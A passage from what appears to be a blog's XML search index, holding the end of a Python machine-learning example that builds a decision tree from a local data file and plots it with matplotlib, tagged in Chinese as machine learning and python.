-0.5/plotTree.totalW; plotTree.yOff = 1.0;  </span><br><span class="line">    plotTree(inTree, (0.5,1.0), &apos;&apos;)  </span><br><span class="line">    plt.show() </span><br><span class="line"></span><br><span class="line">path = r&apos;data.txt&apos;</span><br><span class="line">with open(path) as f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">attributes,lost_star,en = stardust(data)#拿到具体数据集和结果熵</span><br><span class="line">tree=gotcha(lost_star,attributes,en)</span><br><span class="line">print(tree)</span><br><span class="line">createPlot(tree)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
